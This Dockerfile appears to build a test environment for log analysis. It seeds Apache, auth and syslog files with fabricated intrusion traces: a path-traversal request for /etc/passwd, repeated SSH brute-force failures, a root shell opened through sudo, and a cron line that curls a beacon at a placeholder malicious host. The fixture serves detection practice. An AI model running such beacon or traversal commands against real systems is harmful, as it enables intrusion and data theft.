FROM alpine:3.18
RUN mkdir -p /logs

RUN printf '1.2.3.4 - - [10/Apr/2024:12:00:01 +0000] "GET /admin HTTP/1.1" 403 512\n185.220.101.1 - - [10/Apr/2024:12:00:05 +0000] "GET /../../../etc/passwd HTTP/1.1" 400 256\n10.0.0.1 - - [10/Apr/2024:12:00:10 +0000] "POST /login HTTP/1.1" 200 128\n45.33.32.156 - - [10/Apr/2024:12:00:15 +0000] "GET /wp-admin/install.php HTTP/1.1" 404 512\n192.168.1.100 - - [10/Apr/2024:12:01:00 +0000] "GET /index.html HTTP/1.1" 200 1024\n' > /logs/apache-access.log

RUN printf 'Apr 10 12:00:01 host sshd[1234]: Failed password for root from 185.220.101.1 port 54321 ssh2\nApr 10 12:00:02 host sshd[1234]: Failed password for root from 185.220.101.1 port 54322 ssh2\nApr 10 12:00:03 host sshd[1234]: Failed password for admin from 45.33.32.156 port 12345 ssh2\nApr 10 12:00:04 host sshd[1234]: Failed password for ubuntu from 45.33.32.156 port 12346 ssh2\nApr 10 12:00:05 host sshd[1234]: Accepted password for deploy from 10.0.0.5 port 22 ssh2\n' > /logs/auth.log

RUN printf 'Apr 10 12:00:01 host kernel: iptables DROP IN=eth0 SRC=185.220.101.1 DST=10.0.0.1\nApr 10 12:00:10 host cron[999]: (root) CMD (curl -s http://malicious.example.com/beacon)\nApr 10 12:00:20 host sudo[5678]: user1 : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash\nApr 10 12:00:30 host kernel: Oops: general protection fault\nApr 10 12:01:00 host systemd[1]: Started Daily apt download activities.\n' > /logs/syslog

CMD ["tail", "-f", "/dev/null"]
